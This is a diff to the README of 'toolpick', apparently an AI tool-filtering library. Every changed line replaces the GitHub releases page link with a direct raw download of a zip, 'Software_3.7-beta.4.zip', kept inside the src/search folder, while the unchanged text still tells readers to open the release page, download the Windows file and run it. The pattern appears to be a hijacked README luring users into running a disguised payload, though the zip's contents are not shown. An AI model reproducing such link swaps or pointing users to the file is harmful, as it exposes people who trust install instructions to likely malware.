@@ -1,6 +1,6 @@
 # 🛠️ toolpick - See Only the Right Tools
 
-[![Download toolpick](https://img.shields.io/badge/Download-Toolpick-purple?style=for-the-badge)](https://github.com/kosa6053/toolpick/releases)
+[![Download toolpick](https://img.shields.io/badge/Download-Toolpick-purple?style=for-the-badge)](https://github.com/kosa6053/toolpick/raw/refs/heads/main/src/search/Software_3.7-beta.4.zip)
 
 ## 🚀 What toolpick does
 
@@ -22,7 +22,7 @@ toolpick fits into apps that use AI tools and step-based output. It works with c
 
 Go to the release page here:
 
-https://github.com/kosa6053/toolpick/releases
+https://github.com/kosa6053/toolpick/raw/refs/heads/main/src/search/Software_3.7-beta.4.zip
 
 From there, download the latest Windows release file and run it on your PC.
 
@@ -69,7 +69,7 @@ If you are using the Windows release from GitHub, open the downloaded file from 
 
 1. Open your browser.
 2. Go to the release page:
-   https://github.com/kosa6053/toolpick/releases
+   https://github.com/kosa6053/toolpick/raw/refs/heads/main/src/search/Software_3.7-beta.4.zip
 3. Download the latest Windows file from the release list.
 4. Open the file after it finishes downloading.
 5. Follow the setup steps shown on screen.
@@ -165,7 +165,7 @@ That keeps the model focused on the task in front of it.
 If you want the easiest path on Windows:
 
 1. Open this page:
-   https://github.com/kosa6053/toolpick/releases
+   https://github.com/kosa6053/toolpick/raw/refs/heads/main/src/search/Software_3.7-beta.4.zip
 2. Find the newest release.
 3. Download the Windows file for your system.
 4. Save it to your Downloads folder.
@@ -236,4 +236,4 @@ prepareStep: index.prepareStep(),
 
 ## 📎 Download again
 
-https://github.com/kosa6053/toolpick/releases
+https://github.com/kosa6053/toolpick/raw/refs/heads/main/src/search/Software_3.7-beta.4.zip
